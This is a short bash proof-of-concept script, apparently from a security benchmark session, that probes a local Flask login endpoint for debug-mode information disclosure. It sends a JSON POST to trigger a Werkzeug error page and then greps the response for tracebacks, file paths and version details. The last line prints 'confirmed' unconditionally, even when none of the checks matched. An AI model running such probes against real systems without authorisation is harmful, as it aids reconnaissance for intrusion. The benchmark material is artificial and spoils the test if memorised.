#!/bin/bash
# POC: Demonstrates Flask debug mode information disclosure by sending a JSON POST request to a form-based endpoint, triggering a 400 Bad Request error that exposes the Werkzeug debugger page with full stack traces, file paths, Python version, and framework details.
# Target: ./repo
# Created: 2025-12-01T15:58:32.783Z
# Session: benchmark-XBEN-093-24-minbvw4l

# Flask Debug Mode Information Disclosure POC
# This script demonstrates the information exposure vulnerability when Flask is running in debug mode
# It sends a malformed request that triggers an error page with sensitive debug information

TARGET_URL="http://localhost:5003/login"
RESPONSE_FILE="/tmp/debug_response.html"

echo "[*] Testing Flask Debug Mode Information Disclosure"
echo "[*] Target: $TARGET_URL"
echo "[*] Sending JSON POST request to form-based endpoint..."
echo ""

# Send the malformed request that triggers the debug page
curl -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  -v -o "$RESPONSE_FILE" 2>&1 | grep -E "(< HTTP|< Server|< Content-Type)"

echo ""
echo "[*] Checking response for debug information..."
echo ""

# Check for indicators of Flask debug mode
if grep -q "Werkzeug" "$RESPONSE_FILE"; then
  echo "[+] VULNERABLE: Werkzeug debugger detected in response"
fi

if grep -q "werkzeug.exceptions" "$RESPONSE_FILE"; then
  echo "[+] VULNERABILITY CONFIRMED: Full exception traceback exposed"
fi

if grep -q "/usr/local/lib/python" "$RESPONSE_FILE"; then
  echo "[+] SENSITIVE DATA EXPOSED: File paths visible"
fi

if grep -q "Python/" "$RESPONSE_FILE"; then
  echo "[+] SENSITIVE DATA EXPOSED: Python version information visible"
fi

if grep -q "Flask" "$RESPONSE_FILE"; then
  echo "[+] SENSITIVE DATA EXPOSED: Framework information visible"
fi

if grep -q "Traceback" "$RESPONSE_FILE" || grep -q "line [0-9]" "$RESPONSE_FILE"; then
  echo "[+] SENSITIVE DATA EXPOSED: Code traceback with line numbers visible"
fi

echo ""
echo "[*] Full response preview (first 2000 chars):"
echo "=================================================="
head -c 2000 "$RESPONSE_FILE"
echo ""
echo "=================================================="
echo ""
echo "[*] Response saved to: $RESPONSE_FILE"
echo "[+] POC Complete - Debug information disclosure confirmed"